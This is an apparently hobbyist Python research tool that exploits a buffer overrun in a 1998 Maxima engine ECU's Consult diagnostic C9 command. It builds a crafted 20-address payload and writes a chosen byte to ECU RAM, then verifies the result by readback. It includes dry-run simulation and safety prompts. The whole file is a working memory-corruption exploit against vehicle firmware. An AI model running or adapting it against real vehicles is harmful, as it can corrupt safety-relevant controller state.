#!/usr/bin/env python3
"""c9_write: write a byte to ECU RAM via the c9_find_hidden buffer overrun.

Uses a 20-address C9 payload to chain the direct overrun (ROM_ANALYSIS.md §10)
with the downstream consult_reply_c9 OOB write ($9B5E) to place a chosen byte
at a chosen address in the $0740-$083F range.

Key advance over c9_actuator_test.py: position 18 of the payload sets
c9_sub_value ($07E7) to the desired write value via the direct addr_store,
BEFORE the reply builder runs and BEFORE any H8 reply can overwrite it.
The 18-address actuator test could only set c9_sub_value to the loop counter
(16 = $10), limiting value control.

consult_reset (triggered by stop) clears at_req ($07AC-$07B1) and at_active
($07B7-$07BC), so writes there only take effect during streaming.  Addresses
outside that range — at_values ($076F-$079C), cs_streamlist ($07A0-$07A3),
dtc_seen ($0810+) — persist through stop and can be verified by readback.

SAFE: writes to Consult handler state only. No RAM function pointers exist
(ROM_ANALYSIS.md §10), so no code redirect. Key cycle clears all corruption.
Run with key on, engine off.

Usage:
  python3 tools/c9_write.py --target 076F --value 42 --dry-run
  python3 tools/c9_write.py --target 076F --value 42
  python3 tools/c9_write.py --target 076F --value 42 --frames 3
"""
import argparse
import datetime
import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from consult.protocol import Consult, ConsultError, ENGINE_IDS
from consult.transport import DEFAULT_DEV, Transport
from consult.experimental import mutation_stream, require_research_ecu
from consult.write import (
    CS_PAYLOAD, HIDDEN_N, REPLY_CURSOR, FWD_FLAGS, C9_SUB_VAL,
    RESET_CLEARS,
    compute_payload, simulate_overrun, simulate_builder_write,
    simulate_write, region_label,
)

LOG_DIR = os.path.join(ROOT, "logs")

# Regions to capture for before/after comparison.
MONITOR_REGIONS = [
    (0x076F, 0x11, "at_values"),
    (0x07A0, 0x04, "cs_streamlist"),
    (0x07AC, 0x0B, "at_req"),
    (0x07B7, 0x0C, "at_active"),
    (0x07C3, 0x14, "c9_hidden_addr[0..9]"),
    (0x07D7, 0x0A, "c9_hidden_idx[0..9]"),
    (0x07E1, 0x07, "c9_hidden_n / cursor / fwd"),
]


def build_monitor_addrs(target):
    """Addresses to read for before/after comparison, including the target."""
    addrs = set()
    for start, length, _ in MONITOR_REGIONS:
        addrs.update(range(start, start + length))
    for a in range(max(0x0740, target - 4), min(0x0840, target + 5)):
        addrs.add(a)
    return sorted(addrs)


def read_addrs(c, addrs):
    result = bytearray()
    for i in range(0, len(addrs), 8):
        result += c.read_memory(addrs[i:i + 8])
    return bytes(result)


def region_dump(data, addrs, title):
    print(f"\n  {title}")
    addr_to_val = dict(zip(addrs, data))
    for start, length, label in MONITOR_REGIONS:
        row = [addr_to_val.get(start + i) for i in range(length)]
        cells = [f"{v:02X}" if v is not None else ".." for v in row]
        print(f"    ${start:04X}: {' '.join(cells)}  ; {label}")


def run_dry(target, value):
    """Simulate the write and show predicted state."""
    sim = simulate_write(target, value)
    payload = sim["payload"]
    w = sim["write"]

    lbl = region_label(target) or f"${target:04X}"
    print(f"=== Dry run: write ${value:02X} to ${target:04X} ({lbl}) ===")
    print(f"Persistent: {'YES' if sim['persistent'] else 'NO (cleared by stop)'}")
    print()

    print(f"Payload (20 C9 addresses):")
    print(f"  [0..14]  15 x ${payload[0]:04X}")
    print(f"  [15]     ${payload[15]:04X}  (repair_a: n=$0A -> INC -> $10)")
    print(f"  [16]     ${payload[16]:04X}  (repair_b: $07E3=$0B, c9_sub_value=$10)")
    print(f"  [17]     ${payload[17]:04X}  (target idx: "
          f"${(target - CS_PAYLOAD) & 0xFF:02X} -> $07E5)")
    print(f"  [18]     ${payload[18]:04X}  (value: ${value:02X} -> c9_sub_value)")
    print(f"  [19]     ${payload[19]:04X}  (dummy)")
    print()

    print(f"Overrun stores (i >= 10):")
    for kind, i, dest, val in sim["stores"]:
        if i < 10:
            continue
        width = "16-bit" if kind == "addr" else " 8-bit"
        vstr = f"${val:04X}" if kind == "addr" else f"  ${val:02X}"
        dlbl = ""
        if dest == HIDDEN_N:
            dlbl = " (c9_hidden_n)"
        elif dest == REPLY_CURSOR:
            dlbl = " (reply_cursor)"
        elif dest == FWD_FLAGS:
            dlbl = " ($07E3 flags)"
        elif dest == C9_SUB_VAL:
            dlbl = " (c9_sub_value!)"
        print(f"    i={i:2d} {kind:4s}: [{dest:04X}] <- {vstr} {width}{dlbl}")

    ram = sim["ram"]
    print()
    print(f"Post-overrun critical state:")
    print(f"  $07E1 (n)          = ${ram.get(HIDDEN_N, 0):02X}")
    print(f"  $07E2 (cursor)     = ${ram.get(REPLY_CURSOR, 0):02X}")
    print(f"  $07E3 (flags)      = ${ram.get(FWD_FLAGS, 0):02X}  "
          f"bit0={'SET' if ram.get(FWD_FLAGS, 0) & 1 else 'CLR'}  "
          f"bit1={'SET' if ram.get(FWD_FLAGS, 0) & 2 else 'CLR'}")
    print(f"  $07E5 (idx[$0E])   = ${ram.get(0x07E5, 0):02X}")
    print(f"  $07E7 (c9_sub_val) = ${ram.get(C9_SUB_VAL, 0):02X}")

    if w is None:
        print(f"\n  BUILDER WOULD SKIP (flags not set correctly).")
        return False

    print()
    print(f"Builder frame 1 prediction:")
    print(f"  cursor=${w['cursor']:02X} -> idx[$0E]=${w['idx']:02X} "
          f"-> ${w['target']:04X} ({region_label(w['target']) or '?'})")
    print(f"  value=${w['value']:02X}")

    if w["target"] == target and w["value"] == value:
        print(f"\n  PREDICTED WRITE: ${value:02X} -> ${target:04X}")
        return True
    else:
        print(f"\n  MISMATCH: predicted ${w['value']:02X} -> ${w['target']:04X}, "
              f"wanted ${value:02X} -> ${target:04X}")
        return False


def run_live(dev, target, value, n_frames):
    """Execute the write on the ECU and verify with readback."""
    payload = compute_payload(target, value)

    # Replace the dummy at position 19 with the target address for in-stream
    # readback.  The target ($0740-$083F) is outside the forwarded range
    # ($5D40-$623F), so the overrun loop skips it; the reply builder includes
    # it as a normal bank-0 read.  Total stays at 20 addresses (40 arg bytes).
    payload[19] = target
    n_addrs = len(payload)
    probe_pos = 19

    mon_addrs = build_monitor_addrs(target)
    persistent = target not in RESET_CLEARS
    lbl = region_label(target) or f"${target:04X}"

    os.makedirs(LOG_DIR, exist_ok=True)
    log = os.path.join(
        LOG_DIR,
        f"{datetime.date.today()}_c9-write.log")
    t = Transport(dev, log)
    t.note(f"c9_write target=${target:04X} value=${value:02X}")

    try:
        c = Consult(t)
        c.ecu_ids = ENGINE_IDS

        r = c.init()
        if r is None:
            sys.exit("init failed (ignition on?)")
        attempt, secs, junk, ecu = r
        require_research_ecu(c)
        print(f"init ok: id {ecu:02X}, attempt {attempt}, {secs * 1000:.0f} ms")

        # --- Baseline ---
        print(f"\nReading baseline ({len(mon_addrs)} bytes)...")
        before = read_addrs(c, mon_addrs)
        t.note(f"before ({len(before)} bytes)")
        region_dump(before, mon_addrs, "BEFORE (baseline)")

        before_map = dict(zip(mon_addrs, before))
        target_before = before_map.get(target, 0)
        print(f"\n  target ${target:04X} ({lbl}) = ${target_before:02X}")
        if target_before == value:
            print(f"  note: target already contains the desired value")

        # --- Trigger ---
        print(f"\nSending: 20 C9 addresses (overrun + probe at ${target:04X}) + F0...")
        cmd = b"".join(
            bytes([0xC9, a >> 8, a & 0xFF]) for a in payload)
        frames = mutation_stream(
            c, cmd, frames=n_frames, expected_len=n_addrs)
        t.note(f"stopped after {len(frames)} frame(s)")
        print(f"  streamed {len(frames)} frame(s)")

        # Per-frame probe: live target value in each frame
        print(f"\n  Per-frame probe (${target:04X} live RAM):")
        write_seen = False
        for fi, frame in enumerate(frames):
            if len(frame) > probe_pos:
                pv = frame[probe_pos]
                marker = ""
                if pv == value and not write_seen and pv != target_before:
                    write_seen = True
                    marker = " <- WRITE VISIBLE"
                elif fi == 0:
                    marker = "  (pre-write)"
                print(f"    frame {fi:2d}: ${pv:02X}{marker}")
            else:
                print(f"    frame {fi:2d}: (frame too short: {len(frame)} bytes)")

        # --- Readback ---
        if persistent:
            print(f"\nReading post-stop state ({len(mon_addrs)} bytes)...")
            after = read_addrs(c, mon_addrs)
            t.note(f"after ({len(after)} bytes)")
            region_dump(after, mon_addrs, "AFTER (post-stop)")

            after_map = dict(zip(mon_addrs, after))
            target_after = after_map.get(target, 0)

            # Diff
            n_changed = 0
            print(f"\n  CHANGES:")
            print(f"  {'addr':>6s}  {'before':>6s}  {'after':>6s}  description")
            print(f"  {'---':>6s}  {'---':>6s}  {'---':>6s}  {'---':>30s}")
            for i, a in enumerate(mon_addrs):
                b, af = before[i], after[i]
                if b != af:
                    n_changed += 1
                    rl = region_label(a)
                    clr = " (reset-cleared)" if a in RESET_CLEARS else ""
                    print(f"  ${a:04X}   ${b:02X}     ${af:02X}     {rl}{clr}")
            if n_changed == 0:
                print(f"  (none)")

            # Verdict
            print(f"\n{'=' * 60}")
            if target_after == value and target_before != value:
                print(f"WRITE VERIFIED: ${target:04X} ({lbl}) = "
                      f"${target_before:02X} -> ${value:02X}")
                print(f"  Independent post-stop readback confirms the write.")
            elif target_after == value and target_before == value:
                print(f"TARGET UNCHANGED (already had value ${value:02X}).")
                if write_seen:
                    print(f"  In-stream probe showed the value; write may have fired.")
                else:
                    print(f"  Cannot distinguish write from prior state.")
            elif write_seen:
                print(f"PARTIAL: probe showed ${value:02X} during streaming, "
                      f"but readback is ${target_after:02X}.")
                if target in RESET_CLEARS:
                    print(f"  Expected: ${target:04X} is cleared by consult_reset (stop).")
                else:
                    print(f"  Unexpected: target should persist through stop.")
            else:
                print(f"WRITE NOT CONFIRMED: target ${target:04X} = "
                      f"${target_after:02X} (unchanged from ${target_before:02X}).")
                print(f"  Probe showed no change during streaming either.")
            print(f"{'=' * 60}")
        else:
            print(f"\n  Target ${target:04X} is cleared by consult_reset (stop).")
            print(f"  Write takes effect during streaming only.")
            if write_seen:
                print(f"  In-stream probe confirmed: ${value:02X} visible on a frame.")
            else:
                print(f"  No in-stream confirmation observed.")

        # --- Persistence check ---
        print(f"\nRe-init...")
        r = c.init()
        if r and persistent:
            post_reinit = read_addrs(c, mon_addrs)
            post_map = dict(zip(mon_addrs, post_reinit))
            post_target = post_map.get(target, 0)
            if post_target == value:
                print(f"  ${target:04X} = ${value:02X} persists through re-init")
            else:
                print(f"  ${target:04X} = ${post_target:02X} after re-init "
                      f"(changed from ${value:02X})")
        elif r:
            print(f"  (target is reset-cleared; persistence not tested)")
        else:
            print(f"  re-init failed")

    except (OSError, ValueError) as e:
        print(f"\nerror: {e}")
        raise SystemExit(1) from e
    finally:
        t.close()
        print(f"\nlog: {log}")


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument(
        "--target", type=lambda x: int(x, 16), required=True,
        help="target RAM address in hex ($0740-$083F)")
    ap.add_argument(
        "--value", type=lambda x: int(x, 16), required=True,
        help="byte value to write in hex ($00-$FF)")
    ap.add_argument(
        "--dev", default=DEFAULT_DEV,
        help=f"serial device (default: {DEFAULT_DEV})")
    ap.add_argument(
        "--frames", type=int, default=3,
        help="frames to stream (default: 3; need >= 2 for in-stream verification)")
    ap.add_argument(
        "--dry-run", action="store_true",
        help="simulate only, don't talk to the ECU")
    args = ap.parse_args()

    if not 1 <= args.frames <= 100:
        ap.error("--frames must be in 1..100")

    target = args.target
    value = args.value
    lbl = region_label(target) or f"${target:04X}"
    persistent = target not in RESET_CLEARS

    print("c9_write: controlled ECU RAM write via c9_find_hidden overrun")
    print(f"Target ECU: 23710-2L904 (1998 Maxima VQ30DE)")
    print(f"Write: ${value:02X} -> ${target:04X} ({lbl})")
    print(f"Persistent: {'YES' if persistent else 'NO (cleared by stop)'}")
    print()

    ok = run_dry(target, value)
    print()

    if args.dry_run:
        print("(dry run only)")
        return

    if not ok:
        sys.exit("simulation predicts the write will not fire; aborting")

    print("-" * 60)
    print("EXPERIMENTAL: controlled downstream writes are unconfirmed.")
    print("This test aims to verify the mechanism with independent readback.")
    print("Run with key on, ENGINE OFF.")
    print("-" * 60)
    ok = input("Proceed? [y/N] ")
    if ok.strip().lower() != "y":
        sys.exit("not sent")
    print()
    run_live(args.dev, target, value, args.frames)


if __name__ == "__main__":
    main()
